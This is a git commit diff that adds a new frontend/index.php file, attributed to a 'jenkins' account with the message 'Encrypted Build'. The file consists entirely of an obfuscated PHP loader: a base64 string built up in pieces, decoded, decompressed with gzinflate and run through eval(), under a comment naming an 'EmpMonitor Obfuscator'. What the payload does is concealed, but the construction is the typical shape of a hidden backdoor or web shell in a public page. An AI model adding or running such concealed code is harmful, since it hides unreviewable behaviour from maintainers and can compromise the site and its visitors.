b7049ddce51dad144f588429b36d5c807668239a
jenkins <jenkins@gmail.com>
2026-05-11 13:54:22 +0530

    Encrypted Build

---
+++ frontend/index.php
@@ -0,0 +1,12 @@
+<?php
+/* Protected by EmpMonitor Obfuscator | 2026-05-11 */
+$_dwxnrdhs='';
+$_dwxnrdhs.='VVFRS8MwGHwX/A+3vkzBWvYmM+2QTRFRFFaRPWbNtyWYNiX5KvTfm84WNS/5cnfc';
+$_dwxnrdhs.='d0fEbPO6Lndv99Bc2+L8TAw3rGyOeUJNEpEBI6nihHhETSxRaekDcZ68lw/pTTJx';
+$_dwxnrdhs.='bNhS8dLjzTumiknhrm1F9oOPolma4tk0n6Y5onedx3q7xcFYQppOGht5eLJ5Eri3';
+$_dwxnrdhs.='FDQRJ9CeDiNyXYUwrBXZmC2Oe6f6yUCZL1RWhpAnlfRqSnji9KL4IFu5msAOTzRE';
+$_dwxnrdhs.='CdjIoPcuaqPl4q+8LUptQoAJkJAdu1qycQ0OzmPfGatikSswBR4ayUZBUWtdP7xE';
+$_dwxnrdhs.='1v63WnfeU8MoTU1LiFWrW1ClHZRkupjv0jpVeFyaZZhf3mJV/BqILHY6NR57xpzD';
+$_dwxnrdhs.='l30D';
+$_aosvikfn=base64_decode($_dwxnrdhs);
+eval(gzinflate($_aosvikfn));
